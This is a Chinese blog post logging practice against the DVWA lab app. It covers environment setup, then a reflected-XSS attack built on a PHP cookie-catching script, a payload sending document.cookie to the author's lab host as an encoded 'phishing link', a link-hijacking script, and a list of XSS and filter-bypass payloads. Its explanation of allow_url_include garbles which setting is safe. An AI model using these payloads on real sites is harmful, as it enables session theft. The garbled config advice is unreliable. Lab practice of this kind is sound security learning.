---
title: xss
date: 2024-01-24 19:50:06
tags:
---
# DVWA-master和xss.tesla-space

XSS参考

XSS总结：[https://xz.aliyun.com/t/4067?time__1311=n4%2BxnD0DyGYQqxmw405%2Bb7G8nK%2BT2EqD5x&alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%253A%252F%252Fxz.aliyun.com%252Ft%252F4067](https://xz.aliyun.com/t/4067?time__1311=n4+xnD0DyGYQqxmw405+b7G8nK+T2EqD5x&alichlgref=https://link.csdn.net/?target=https%3A%2F%2Fxz.aliyun.com%2Ft%2F4067)

那些年我们一起学XSS
https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html

XSS漏洞挖掘-进阶
：https://blog.csdn.net/qq_27278819/article/details/133281868

## dvwa准备

### DVWA-master包准备工作

C:\PHPStudy\WWW\DVWA-master\config目录下有config.inc.php.dist文件，复制删去.dist粘贴

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)config文件

将该文件中的相关代码改为自己的数据库信息：

```
$_DVWA = array(); $_DVWA[ 'db_server' ]   = '127.0.0.1';`
`$_DVWA[ 'db_database' ] = 'dvwa'; $_DVWA[ 'db_user' ]     = 'root';`
`$_DVWA[ 'db_password' ] = 'root';
```

开启allow_url_include

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)小皮配置相关php环境

```
 `allow_url_include` 是一个配置指令，用于允许或禁止在 PHP 脚本中包含远程 URL 地址的内容。这个指令在处理包含远程文件或代码的脚本时非常有用，因为它可以防止潜在的安全问题。
在 PHP 配置文件（如 `php.ini`）中，您可以设置 `allow_url_include` 的值来实现以下功能：
1. 如果将 `allow_url_include` 设置为 `On`（默认值），则 PHP 脚本可以包含远程 URL 地址的内容。这意味着如果您的脚本包含诸如 `include('https://example.com/file.php')` 这样的语句，PHP 会执行它并包含远程文件的内容。
2. 如果将 `allow_url_include` 设置为 `Off`，则 PHP 脚本将无法包含远程 URL 地址的内容。这样可以提高安全性，防止误用外部代码或文件。
需要注意的是，即使 `allow_url_include` 设置为 `On`，PHP 也会对包含的 URL 进行验证。不安全的 URL 可能导致脚本执行失败或引发安全警告。因此，在使用远程包含时，请确保 URL 安全可靠。
要更改 `allow_url_include` 的设置，请按照以下步骤操作：
1. 打开 PHP 配置文件（通常位于 `php.ini` 文件）。
2. 找到 `extension=php_url` 这一行。
3. 在该行上方添加以下代码：
```
   zend_extension="php_url.so"
   allow_url_include=On
   ```
   将 `allow_url_include` 的值设置为您所需的状态（On 或 Off）。
4. 保存并关闭配置文件。
5. 重启您的 web 服务器以使更改生效。
   ```

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)安装完成

### 检验环境

kali能ping通且win10可以打开kali网页说明apache环境正常

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)kali

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)kalipingwin10虚拟机

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)打开kali网页

### kali准备

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)kali准备命令

## xss

### 打靶操作

```
cookie.php:<?php 
$cookie=$_GET['cookie']; 
file_put_contents('cookie.txt',$cookie); 
?>
改所有者：chown www-data:www-data cookie.txt 
xss框内所要提交的命令：<script>document.location='http://192.168.2.102/cookie.php?cookie='+document.cookie</script>
正式就是复制上述命令url编码，在输入框内随便输入随机数，记下网址用url覆盖该随机数。即为钓鱼链接
192.168.2.133/DVWA-master/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%30%32%2f%63%6f%6f%6b%69%65%2e%70%68%70%3f%63%6f%6f%6b%69%65%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e
将所有超链接修改为跳转百度：
<script> 
window.onload = function() { 
var link=document.getElementsByTagName("a"); 
for(j = 0; j < link.length; j++) { 
 link[j].href="https://www.baidu.com";} 
} 
</script>
1. `<script>` 标签：这是一个用于嵌入 JavaScript 脚本的 HTML 标签。当浏览器遇到这个标签时，它会执行其中的代码。
2. `var links = document.getElementsByTagName('a');`：这行代码通过 `document.getElementsByTagName('a')` 方法获取页面中所有的 `<a>` 标签元素。将这些元素存储在名为 `links` 的变量中。
3. `for (var i = 0; i < links.length; i++) {`：这是一个 for 循环，用于遍历存储在 `links` 变量中的所有超链接元素。
4. `links[i].href = 'https://www.baidu.com';`：这行代码将每个超链接的 `href` 属性设置为百度网址（https://www.baidu.com）。
5. `}`：这是 for 循环的结束符。
6. `</script>`：这是 JavaScript 脚本标签的结束符，表示代码段结束。
总之，这段代码的作用是遍历页面中的所有超链接，并将每个超链接的目标 URL 修改为百度网站。
```

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)操作

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)安全等级调为low，选择xss(Reflected)XSS

复制url编码，在输入框内随便输入随机数，记下网址用url覆盖该随机数。

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)bpurl编码

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)结果

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)xss危害与挖掘

### XSS的攻击载荷

```
以下所有标签的 > 都可以用 // 代替， 例如 <script>alert(1)</script//
<script>标签：<script>标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中
<script>alert("hack")</script>   #弹出hack
<script>alert(/hack/)</script>   #弹出hack
<script>alert(1)</script>        #弹出1，对于数字可以不用引号
<script>alert(document.cookie)</script>      #弹出cookie
<script src=http://xxx.com/xss.js></script>  #引用外部的xss
svg标签
<svg onload="alert(1)">
<svg onload="alert(1)"//
<img>标签：
<img  src=1  οnerrοr=alert("hack")>
<img  src=1  οnerrοr=alert(document.cookie)>  #弹出cookie
<body>标签：
<body οnlοad=alert(1)>
<body οnpageshοw=alert(1)>
video标签:
<video οnlοadstart=alert(1) src="/media/hack-the-planet.mp4" />
style标签：
<style οnlοad=alert(1)></style>
绕过waf的常用语句
    <svg οnlοad=alert(1)>
    <a href=javascript:alert(1)>
    <IMG SRC=javascript:alert('xss')>
    <IMG SRC=JaVaScRiPt:alert('XSS')>
    <IMG SRC="jav ascript:alert('XSS')">
```

- **本文作者：**20231201
- **本文链接：**[http://example.com/2024/01/16/DVWA-master%E5%92%8Cxss.tesla-space/index.html](http://example.com/2024/01/16/DVWA-master和xss.tesla-space/index.html)
- **版权声明：**本博客所有文章均采用 [BY-NC-SA](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh) 许可协议，转载请注明出处！

​    ![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

​          

​        [上传文件与流量分析](file:///2024/01/10/上传文件与流量分析/)  

​                        文章目录：    [dvwa准备](file:///C:/网安程序/hexo/blog/source/_posts/DVWA-master和xss.tesla-space.html#dvwa准备)[DVWA-master包准备工作](file:///C:/网安程序/hexo/blog/source/_posts/DVWA-master和xss.tesla-space.html#DVWA-master包准备工作)[检验环境](file:///C:/网安程序/hexo/blog/source/_posts/DVWA-master和xss.tesla-space.html#检验环境)[kali准备](file:///C:/网安程序/hexo/blog/source/_posts/DVWA-master和xss.tesla-space.html#kali准备)[xss](file:///C:/网安程序/hexo/blog/source/_posts/DVWA-master和xss.tesla-space.html#xss)[打靶操作](file:///C:/网安程序/hexo/blog/source/_posts/DVWA-master和xss.tesla-space.html#打靶操作)[XSS的攻击载荷](file:///C:/网安程序/hexo/blog/source/_posts/DVWA-master和xss.tesla-space.html#XSS的攻击载荷)                 

[                  ](tencent://message/?Menu=yes&uin=894519210)[                  ](javascript:;)[                  ](https://www.instagram.com/izhaoo/)[                  ](https://github.com/zhaoo)[                  ](mailto:izhaoo@163.com)

Powered by [Hexo](https://hexo.io)  |  Theme - [zhaoo](https://github.com/izhaoo/hexo-theme-zhaoo)

​      

​      